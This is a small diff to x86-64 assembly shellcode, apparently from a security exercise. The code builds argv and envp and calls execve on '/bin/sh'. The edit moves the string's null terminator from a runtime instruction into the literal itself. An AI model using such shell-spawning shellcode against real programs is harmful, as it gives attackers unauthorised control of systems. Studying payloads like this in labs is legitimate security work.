@@ -4,7 +4,7 @@
 
 #include <sys/syscall.h>
 
-#define STRING  "/bin/sh"
+#define STRING  "/bin/sh\0"
 #define STRLEN  7
 #define ARGV    (STRLEN+1)
 #define ENVP    (ARGV+8)
@@ -21,7 +21,6 @@ payload:
         movq    %rcx, (ARGV)(%rcx)       /* set up argv pointer to pathname */
 
         xorq    %rax, %rax               /* get a 64-bit zero value */
-        movq    %rax, (STRLEN)(%rcx)     /* null-terminate our string */
         movq    %rax, (ENVP)(%rcx)       /* set up null envp */
 
         movq    $SYS_execve, %rax        /* syscall arg 1: syscall number */
